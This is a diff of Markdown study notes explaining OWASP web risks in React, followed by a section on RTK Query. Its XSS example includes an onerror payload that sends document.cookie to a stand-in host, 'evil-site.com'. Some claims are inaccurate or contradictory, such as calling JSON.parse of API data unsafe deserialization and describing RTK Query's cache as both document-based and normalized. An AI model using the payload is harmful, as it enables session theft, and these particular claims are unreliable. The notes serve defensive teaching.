@@ -2,8 +2,69 @@
 
 OWASP (Open Web Application Security Project) lists the most common web application security risks. Here are explanations of some key OWASP attacks and how to prevent them in a React application:
 
-1.  ` Injection Attacks`
-    Description: Injection attacks occur when an attacker injects malicious data into a web application, often through user input, to execute unauthorized commands.
+1.  `Injection Attacks`
+    A. Description: Injection attacks occur when an attacker injects malicious data into a web application, often through user input, to execute unauthorized commands.
+
+    B. Injection attacks occur when untrusted or malicious data is sent to an application and is processed as code rather than data. In React applications, this can happen through various entry points like user inputs, URL parameters, or API responses.
+
+**Common Types of Injection Attacks in React:**
+
+1. Cross-Site Scripting (XSS)
+2. SQL Injection
+3. HTML Injection
+4. JavaScript Injection
+
+How Injection Attacks Can Happen:
+
+1. Unsafe innerHTML Usage:
+
+```js
+// Vulnerable code : This code blindly trusts and renders whatever HTML content is passed in the userData prop using dangerouslySetInnerHTML without any sanitization.
+
+function DisplayUser({ userData }) {
+  return <div dangerouslySetInnerHTML={{ __html: userData }} />;
+}
+
+// Attacker could pass malicious userData like:
+const maliciousData = `
+  <img src="x" onerror="
+    alert('Hacked!');
+    fetch('https://evil-site.com/steal', {
+      method: 'POST',
+      body: JSON.stringify(document.cookie)
+    });
+  ">
+`;
+
+<DisplayUser userData={maliciousData} />;
+
+// Use JSX Escaping:
+// Safe approach - React automatically escapes values
+function SafeComponent({ userInput }) {
+  return <div>{userInput}</div>;
+}
+```
+
+2. URL Parameter Injection:
+
+```js
+// Vulnerable code
+function SearchComponent() {
+  const query = new URLSearchParams(window.location.search).get("q");
+  return <div dangerouslySetInnerHTML={{ __html: query }} />;
+}
+
+//  Fixed Code:
+
+import DOMPurify from "dompurify";
+
+function SearchComponent() {
+  const query = new URLSearchParams(window.location.search).get("q");
+  const sanitizedContent = DOMPurify.sanitize(query);
+
+  return <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />;
+}
+```
 
 `Prevention in React:`
 
@@ -169,13 +230,55 @@ const SafeRedirect = ({ url }) => {
 ```
 
 4. `Insecure Deserialization`
-   Description: Deserializing data from untrusted sources can lead to code execution vulnerabilities.
+   A. Description: Deserializing data from untrusted sources can lead to code execution vulnerabilities.
+
+   B. Insecure Deserialization is a security vulnerability that occurs when untrusted data is used to abuse the deserialization process. When an application deserializes malicious data, it can lead to:
+
+   a. Remote code execution
+   b. Denial of Service (DoS) attacks
+   c. Data tampering
+   d. Privilege escalation
+
+`How it can happen in React applications:`
+
+1. Local Storage/Session Storage:
+
+```js
+// Vulnerable code
+const userData = localStorage.getItem("user");
+const user = JSON.parse(userData); // Unsafe deserialization
+```
+
+2. API Responses:
+
+```js
+// Vulnerable code
+fetch("/api/data")
+  .then((response) => response.json()) // Unsafe deserialization of API response
+  .then((data) => setState(data));
+```
+
+3. URL Parameters:
+
+```js
+// Vulnerable code
+const params = new URLSearchParams(window.location.search);
+const data = JSON.parse(params.get("data")); // Unsafe deserialization
+```
 
 `Prevention in React:`
 
 a. Avoid deserializing untrusted data: Only deserialize data from trusted sources.
 
 b. Use secure deserialization libraries: If deserialization is necessary, use libraries that safely handle it.
+
+c. Implement proper error handling.
+
+d. Keep dependencies updated
+
+e. Use HTTPS for API communications
+
+f. Implement Content Security Policy (CSP)
 
 9. `Using Components with Known Vulnerabilities`
    Description: Using components with known vulnerabilities exposes your application to attacks.
@@ -202,10 +305,52 @@ module.exports = {
 ```
 
 10. `Insufficient Logging & Monitoring`
-a. Keep logs secure
-b. Monitor critical operations
-c. Set up alerts
-d. Regular log analysis
-e. Maintain audit trails
-f. Follow privacy regulations
-g. Implement proper retention policies
+    a. Keep logs secure
+    b. Monitor critical operations
+    c. Set up alerts
+    d. Regular log analysis
+    e. Maintain audit trails
+    f. Follow privacy regulations
+    g. Implement proper retention policies
+
+### What is RTK Query, how does it work, and how does it differ from our standard implementation?
+
+RTK Query is a tool built into Redux Toolkit designed to simplify data fetching and caching in web applications. It eliminates the need for manually writing logic for API calls, caching, and managing request states like loading or errors.
+
+OR
+
+RTK Query is a powerful data fetching and caching tool included in Redux Toolkit that automates common data fetching patterns.
+
+`Differences from Standard Redux Implementations : `
+
+1. RTK Query offers several advantages over traditional Redux implementations using createSlice and createAsyncThunk:
+
+2. Simplified API Calls: Traditional Redux requires setting up thunks, dispatching actions, and writing reducers to manage API states. RTK Query abstracts this into a single API slice.
+
+3. Automatic State Management: Loading, error, and success states are automatically handled by RTK Query hooks, reducing boilerplate code.
+
+4. Integrated Caching: Unlike standard Redux where caching logic must be implemented manually, RTK Query provides built-in caching and invalidation mechanisms.
+
+5. Centralized Configuration: All API endpoints are defined in one place (API slice), improving maintainability compared to scattered custom hooks or thunks.
+
+6. Document Cache vs Normalized Cache: RTK Query uses a document cache approach, storing query results independently without deduplication across queries. This is simpler but less sophisticated than normalized caches used in tools like Apollo Client.
+
+7. Automatic Re-fetching:
+   a. Can configure automatic polling
+
+b. Refetches when window regains focus
+
+c. Refetches when network is restored
+
+8. Code Reduction:
+   a. Eliminates boilerplate code
+   b. No need for separate actions/reducers
+   c. Generates hooks automatically
+
+9. Performance Optimization:
+   a. Deduplication of requests
+   b. Normalized cache storage
+   c. Efficient updates
+   d. Request cancellation
+
+`NOTE :` RTK Query significantly reduces boilerplate code while providing advanced features for data fetching and caching, making it a preferred choice for many Redux-based applications.
